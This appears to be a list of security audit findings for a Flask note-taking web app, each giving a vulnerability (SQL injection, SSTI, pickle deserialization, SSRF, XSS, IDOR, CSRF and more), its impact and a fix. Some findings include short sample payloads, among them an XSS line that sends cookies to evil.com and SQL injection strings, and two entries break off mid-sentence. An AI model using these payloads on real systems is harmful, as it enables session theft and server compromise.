extra.message:
IDOR - Unauthorized Access to Other Users' Personal Notes

The get_personal_notes endpoint accepts a user_id path parameter and returns all notes for that user without verifying that the authenticated user is authorized to view them. Any authenticated user can access any other user's notes by changing the user_id in the URL.

Impact: Any authenticated user can enumerate user IDs and view all notes (including private ones) belonging to any other user, leading to unauthorized data access and PII exposure.

Fix: Add an authorization check to verify that user_id == current_user.id (or that the current user is an admin) before returning the notes.

Server-Side Template Injection (SSTI) in 404 Error Handler

The 404 error handler uses render_template_string with an f-string that includes request.path directly. An attacker can craft a URL containing Jinja2 template expressions (e.g., {{config}}, {{7*7}}) which will be evaluated server-side, leading to arbitrary code execution.

Impact: An attacker can execute arbitrary Python code on the server by navigating to a URL like /{{config.items()}} or /{{''.__class__.__mro__[1].__subclasses__()}}. This leads to full remote code execution, data exfiltration, and complete server compromise.

Fix: Use render_template instead of render_template_string, or pass user input as a template variable: render_template_string('{{ error }}. Requested URL was {{ path }}', error=error, path=request.path)

Insecure Pickle Deserialization of Cookie Data

The before_request handler deserializes the 'preferences' cookie using pickle.loads(b64decode(preferences)). Since cookies are user-controlled, an attacker can craft a malicious pickle payload to achieve arbitrary code execution.

Impact: An attacker can craft a malicious pickle payload, base64-encode it, and set it as the 'preferences' cookie. When the server deserializes it, arbitrary Python code executes, leading to full remote code execution and server compromise.

Fix: Replace pickle serialization with JSON (json.loads/json.dumps) for cookie data, or use Flask's signed session cookies which include HMAC verification. Never deserialize untrusted data with pickle.

SQL Injection in Note Search

The search endpoint constructs a SQL text clause using f-string interpolation with the user-supplied 'search_param'. This allows SQL injection through the search query parameter.

Impact: An authenticated attacker can inject arbitrary SQL to extract data from any table in the database, including user credentials, private notes of other users, and registration codes. For example: search=%' OR 1=1 UNION SELECT ...

Fix: Use parameterized queries: text('text like :search').params(search=f'%{search_param}%') or use SQLAlchemy's Note.text.like(f'%{search_param}%')

SSRF via Profile Image URL Fetch

The add_image endpoint passes a user-controlled URL (form.url.data) to get_base64_image_blob(), which calls urlopen() to fetch the URL. There is no validation to prevent requests to internal services, cloud metadata endpoints (e.g., http://169.254.169.254/), or other internal resources.

Impact: An attacker can make the server fetch internal resources, access cloud metadata services, scan internal networks, and potentially exfiltrate sensitive data.

Fix: Validate and restrict the URL to allowed domains/schemes. Block requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x, 127.x, ::1). Use an allowlist of permitted schemes (http, https only).

Mass Assignment - is_admin Field in Account Update

The update_account endpoint binds form data directly to the current_user object using current_user.__dict__.update(filtered_values). The AccountForm includes an 'is_admin' BooleanField, and the filtered_values dict only excludes 'password'. An attacker can submit is_admin=true in the form to escalate their privileges to admin.

Impact: Privilege escalation. Any authenticated user can make themselves an admin by including is_admin in the POST request to /account.

Fix: Whitelist only the fields that users are allowed to update (e.g., email). Remove is_admin from the AccountForm or explicitly exclude it from the update dict.

SQL Injection in Registration Code Validation

The validate_token function constructs a raw SQL query using f-string interpolation with the user-supplied 'code' parameter. This allows SQL injection attacks through the registration code field.

Impact: An attacker can bypass registration code validation, extract data from the database (including user credentials, all registration codes), or modify/delete data. For example, injecting ' OR '1'='1 would return any registration code.

Fix: Use parameterized queries: session.execute(text('SELECT id, code FROM registration_code WHERE code = :code'), {'code': code})

Stored XSS via Note Text with |safe Filter

The note text is rendered with the |safe Jinja2 filter, which disables HTML escaping. Since note text comes from a CKEditor rich text field, an attacker can inject arbitrary JavaScript that will execute in other users' browsers when they view shared (non-private) notes.

Impact: An attacker can create a note with malicious JavaScript (e.g., <script>document.location='http://evil.com/?c='+document.cookie</script>) that executes in the browsers of all users who view the home page, enabling session hijacking, account takeover, and data theft.

Fix: Sanitize HTML content server-side using a library like bleach before storing or rendering it. Only allow a whitelist of safe HTML tags and attributes. Do not use the |safe filter on user-controlled content without sanitization.

Stored XSS via safe_columns in personal_notes.html render_table

The `render_table` macro is called with `safe_columns=['text']`, which marks the 'text' column as safe (unescaped). Since note text is user-controlled, this allows stored XSS when viewing personal notes.

Impact: An attacker can inject arbitrary JavaScript into note text that executes when any user views the personal notes page, enabling session hijacking and account takeover.

Fix: Remove `safe_columns=['text']` from the render_table call, or sanitize the HTML content server-side before rendering.

Stored XSS via safe_columns in search.html render_table

The `render_table` macro is called with `safe_columns=['text']`, which marks the 'text' column as safe (unescaped). Since note text is user-controlled, this allows stored XSS when viewing search results.

Impact: An attacker can inject arbitrary JavaScript into note text that executes when any user performs a search and views results, enabling session hijacking and account takeover.

Fix: Remove `safe_columns=['text']` from the render_table call, or sanitize the HTML content server-side before rendering.

Path Traversal via SSRF in Profile Image URL

The download function uses urlopen() with a user-supplied URL without any validation or restriction. The urlopen function supports file:// protocol, allowing an attacker to read arbitrary local files from the server (e.g., file:///etc/passwd).

Impact: An attacker can use file:// URLs to read arbitrary files from the server filesystem, including /etc/passwd, application source code, database files, and configuration files containing secrets.

Fix: Validate and restrict the URL scheme to only http:// and https://. Implement an allowlist of domains or block internal/private IP ranges. Use a dedicated HTTP client library with proper restrictions.

CSRF Protection Missing Globally

The Flask application does not initialize Flask-WTF's CSRFProtect. None of the POST forms (login, signup, account update, note creation, note deletion, darkmode toggle, image upload, registration code generation) have CSRF tokens. An attacker can craft malicious pages that submit forms on behalf of authenticated users.

Impact: An attacker can perform actions on behalf of authenticated users including creating/deleting notes, changing account settings, and updating profile images.

Fix: Initialize Flask-WTF CSRFProtect: from flask_wtf.csrf import CSRFProtect; csrf = CSRFProtect(app) and include CSRF tokens in all forms.

Hardcoded Secret Key

The Flask secret key is hardcoded as the string 'super secret key'. This key is used to sign session cookies and other security-sensitive tokens. Anyone with access to the source code (which is public on GitHub) can forge session cookies and impersonate any user.

Impact: An attacker can forge Flask session cookies, impersonate any user including admins, and gain full access to the application.

Fix: Generate a cryptographically random secret key and store it in an environment variable or secrets manager. For example: app.secret_key = os.environ['SECRET_KEY']

Missing Rate Limiting on Login Endpoint

The do_login() handler at POST /login has no rate limiting, allowing unlimited login attempts. This enables brute-force attacks against user credentials.

Impact: An attacker can perform unlimited brute-force login attempts to guess user passwords.

Fix: Implement rate limiting on the login endpoint using Flask-Limiter or similar middleware.

Session Fixation - No Session Regeneration on Login

The do_login() handler authenticates the user and calls login_user() but never regenerates the session ID. Flask's default session handling does not automatically regenerate the session ID upon login. An attacker who can set or know a victim's session ID before login can hijack the session after authentication.

Impact: An attacker can fixate a session ID on a victim's browser, then hijack the authenticated session after the victim logs in.

Fix: Regenerate the session after successful authentication by calling session.regenerate() or clearing and recreating the Flask session (e.g., session.clear() before login_user()).

Note Deletion Without Ownership Check (IDOR)

The delete_note endpoint allows any authenticated user to delete any note by ID without verifying that the note belongs to the current user. While the template only shows delete buttons for owned notes, the server-side endpoint lacks authorization checks.

Impact: Any authenticated user can delete any other user's notes by sending a POST request with an arbitrary note_id, leading to unauthorized data destruction.

Fix: Add an authorization check: verify that note.user_id == current_user.id (or current_user.is_admin) before deleting the note.

Missing Rate Limiting on Signup Endpoint

The do_signup() handler at POST /signup has no rate limiting, allowing unlimited registration attempts. This enables brute-force attacks against registration codes.

Impact: An attacker can brute-force registration codes to create unauthorized accounts. The static code 'a36e990b-0024-4d55-b74a-f8d7528e1764' in db_seed.py makes this even more exploitable.

Fix: Implement rate limiting on the signup endpoint.
Stored XSS via profile_image data URI in account.html The profile image is rendered in an `
Stored XSS via profile_image data URI in base.html The profile image is rendered as a data URI in an `

Insecure Session Cookie - Missing Secure Flag

The Flask app does not set SESSION_COOKIE_SECURE=True. Session cookies will be transmitted over unencrypted HTTP connections, allowing interception by network attackers. The nginx config also only listens on port 80 (HTTP).

Impact: Session cookies can be intercepted over unencrypted HTTP connections, enabling session hijacking.

Fix: Set app.config['SESSION_COOKIE_SECURE'] = True and serve the application over HTTPS.

Nginx Listening on HTTP Only (No TLS)

The nginx server is configured to listen only on port 80 (HTTP) without TLS/SSL. All traffic including session cookies, credentials, and PII is transmitted in cleartext.

Impact: All data transmitted between clients and the server, including credentials and session tokens, can be intercepted by network attackers.

Fix: Configure nginx to listen on port 443 with TLS certificates and redirect HTTP to HTTPS.

SQLAlchemy Echo Mode Exposes SQL Queries in Logs

The SQLAlchemy engine is configured with echo=True, which logs all SQL statements including potentially sensitive data in query parameters to stdout/stderr. This can expose PII and other sensitive information in production logs.

Impact: SQL queries containing user data (emails, search terms, note content) are logged to stdout, potentially exposing PII in log aggregation systems.

Fix: Set echo=False in production or use environment-based configuration to only enable SQL logging in development.

Preferences Cookie Missing HttpOnly Flag

The 'preferences' cookie is set via set_cookie() without httponly=True. This allows JavaScript to read the cookie, which could be exploited in XSS attacks to steal or manipulate the cookie (which is deserialized via pickle).

Impact: JavaScript (including injected XSS payloads) can read and modify the preferences cookie, which is deserialized with pickle, enabling remote code execution.

Fix: Set httponly=True when creating the cookie: response.set_cookie('preferences', ..., httponly=True)

No Response Size Limit on Profile Image Download

The download function reads the entire response with response.read() without any size limit. An attacker could provide a URL pointing to a very large file, causing memory exhaustion on the server.

Impact: Denial of service through memory exhaustion by providing URLs to very large files.

Fix: Limit the response size by reading in chunks and enforcing a maximum size, e.g., response.read(MAX_SIZE).
